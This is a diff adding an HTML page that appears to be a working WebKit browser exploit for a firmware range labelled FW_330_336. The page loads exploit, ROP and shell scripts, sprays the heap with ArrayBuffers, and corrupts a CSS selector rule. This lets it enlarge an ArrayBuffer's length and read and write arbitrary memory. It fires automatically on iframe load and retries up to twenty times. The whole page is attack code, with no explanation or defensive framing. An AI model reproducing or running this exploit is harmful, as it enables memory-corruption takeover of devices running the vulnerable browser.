@@ -1,0 +1,137 @@
+<html>
+<style>
+html, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, em:nth-child(5){
+    height: 500px
+}
+</style>
+
+<script src="include/FW_330_336/exploit.js"></script>
+<script src="include/FW_330_336/jquery.min.js"></script>
+<script src="include/FW_330_336/lib.js"></script>
+<script src="include/FW_330_336/rop.js"></script>
+<script src="include/FW_330_336/shell.js"></script>
+<script src="include/FW_330_336/utils.js"></script>
+
+<script type="text/javascript">
+var tries = 0;
+arrays = new Array();
+gc = new Array();
+newarrays = new Array();
+latest = new Array();
+
+function payload()
+{
+	for (var i = 0; i < 0x1000; ++i) {
+        gc.push(new ArrayBuffer(0x30));
+        gc.push(new ArrayBuffer(0x40));
+        gc.push(new ArrayBuffer(0x4));
+    }
+
+    var cssRules = window.getMatchedCSSRules(document.documentElement);
+
+    cssRules[0].selectorText = 'a1,a2,a3,a4,a5,a6';
+
+    for (var i = 0; i < 0x100; ++i)
+        arrays.push(new ArrayBuffer(0x20040));
+		
+    setTimeout(check, 100);
+}
+
+function crashme()
+{
+    document.getElementsByTagName("iframe")[0].contentWindow.scrollX;
+    document.open();
+}
+
+function crash()
+{
+    document.write('<iframe></iframe><object onbeforeload="crashme()">');
+    document.body.offsetLeft;
+    setTimeout(function() {
+        document.close();
+    }, 1);
+    throw "BadLuck";
+}
+
+function check()
+{
+    corrupted = undefined;
+    for (var i = 0; i < arrays.length; ++i) {
+        if (arrays[i].byteLength == 0x200c0) {
+            corrupted = arrays[i];
+            break;
+        }
+    }
+	
+    if (!corrupted)
+        crash();
+    
+	arrays = new Array();
+    gc = new Array();
+
+    setTimeout(spray, 10);
+}
+
+function spray()
+{
+    ++tries;
+	
+	document.write("Attempt #" + tries + "<br>");
+	
+    if (tries > 20)
+	{
+		document.write("Too many attempts!");
+        crash();
+	}
+	
+    latest = new Array();
+    for (var i = 0; i < 0x20000; ++i) {
+        var t = new ArrayBuffer(0x7);
+        newarrays.push(t);
+        latest.push(t);
+    }
+
+    var u32 = new Uint32Array(corrupted);
+
+    var found = false;
+    for (var i = 0; i < 0xc0 / 4; ++i) {
+        var j = 0x20000 / 4 + i;
+        if (u32[j] == 0x7) {
+            found = true;
+            u32_base = u32[j - 1];
+            u32[j - 1] = 0;
+            u32[j] = 0xFFFFFFE0;
+        }
+    }
+	
+    if (found) {
+        for (var i = 0; i < latest.length; ++i) {
+            if (latest[i].byteLength == 0xFFFFFFE0) {
+                big = latest[i];
+                break;
+            }
+		}
+        newarrays = undefined;
+        latest = undefined;
+        document.write("Success!");
+
+        aspace = new Uint8Array(big);
+        aspace16 = new Uint16Array(big);
+        aspace32 = new Uint32Array(big);
+		
+        setTimeout(function() {
+			var res = initMemoryHole();
+            
+			if (res == -1) {
+				logdbg("Initialization failed!");
+				crash();
+			}
+        }, 100);
+    } else {
+        setTimeout(spray, 10);
+    }
+}
+</script>
+
+<iframe onload=payload()>
+</html>
